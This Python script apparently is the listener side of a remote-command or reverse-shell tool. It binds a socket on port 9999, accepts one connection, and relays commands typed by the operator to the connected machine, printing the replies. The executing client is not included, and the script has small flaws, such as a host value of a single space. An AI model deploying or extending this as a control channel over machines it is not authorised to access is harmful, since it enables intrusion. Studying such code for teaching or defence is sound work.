import socket
import sys


# creating a socket allows two computers to connect
def socket_create():
    try:
        global host
        global port
        global s
        host = ' '
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

        # Bind socket to port and wait for connection


def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port:" + str(port))
        s.bind((host, port))
        s.listen(5)  # represents the ammount of bad connections we'll take
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying..")
        socket_bind()

        # establish connection with client (socket must be listening)


def socket_accept():
    conn, address = s.accept()
    print("Connection has been establised | " + "IP" + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()

    # self explanatory it sends commands


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()